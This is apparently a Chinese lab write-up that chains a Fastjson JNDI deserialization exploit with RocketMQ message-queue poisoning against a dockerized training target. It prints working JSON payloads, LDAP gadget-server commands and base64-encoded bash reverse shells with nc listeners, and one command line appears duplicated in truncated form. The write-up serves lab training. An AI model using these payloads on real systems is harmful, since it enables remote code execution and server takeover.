API靶场-从消息队列缓存投毒到Fastjson_RCE
===

# 环境部署
```
docker-compose up -d 
```
访问http://ip:58080为springboot即成功部署。


# 攻击

代码审计发现/AddUser路由存在fastjson jndi漏洞，虽然jdk版本非常高，但是存在CC依赖可以作为本地gadget进行攻击。


```
nc -lvp 50000
```
```
POST /AddUser

{"id":"123","username":{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ip:1099/vspk6i","autoCommit":true}},"password":"123"}
```

```
java -cp fastjson_tool.jar fastjson.LDAPRefServer2 1099  CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9kb2NrZXIuZm9yLm1hYy5ob3N0LmludGVybmFsLzUwMDAwIDA+JjE=}|{base64,-d}|{bash,-i}"
```

反弹shell之后可以访问Rocketmq和目标服务器。

代码审计发现目标服务器从Rocketmq消息队列取消息进行消费的过程存在fastjson jndi漏洞，因此可以进行缓存投毒。只要成功往Rocketmq的消息队列中推入fastjson的恶意payload，只需等待一段时间目标服务器总会消费到恶意payload，造成Rce。


```
nc -lvp 49999
```
```
java -cp fastjson_tool.jar fastjson.LDAPRefServer2 1098  CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9kb2NrZXIuZm9yLm1hYy5ob3N0LmludGVybmFsLzQ5OTk5IDA+JjE=}|{base64,-d}|{bash,-i}"
```

```
cd /tmp

java -jar MQProducer-1.0-SNAPSHOT-jar-with-dependencies.jar '10.0.20.12:9876' PID_BLOG_PROJECT T_DEMO_PROJECT ADD_USER '{"id":"123","username":{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://docker.for.mac.host.internal:1098/vspk6i","autoCommit":true}},"password":"123"}'
<er.for.mac.host.internal:1098/vspk6i","autoCommit":true}},"password":"123"}'
```

成功获取消费者服务器权限。






